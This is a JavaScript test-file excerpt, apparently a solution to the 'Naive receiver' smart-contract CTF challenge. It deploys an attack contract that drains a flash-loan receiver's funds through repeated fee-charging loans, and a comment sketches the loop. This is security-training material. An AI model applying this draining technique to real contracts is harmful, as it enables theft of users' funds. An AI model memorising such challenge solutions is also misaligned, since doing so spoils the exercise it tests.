...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Exploit', async function () {
        ...
        const attackContractFactory = await ethers.getContractFactory('NaiveFlashLoanAttack', attacker);
        const attackContract = await attackContractFactory.deploy();
        await attackContract.connect(attacker).drain(
            this.receiver.address,
            this.pool.address,
        );
        // The contract basically does this:
        // for (let i = 0; i < balance/FEE; ++i) {
        //     this.pool.connect(attacker).flashLoan(this.receiver.address, 9)
        // }
    });
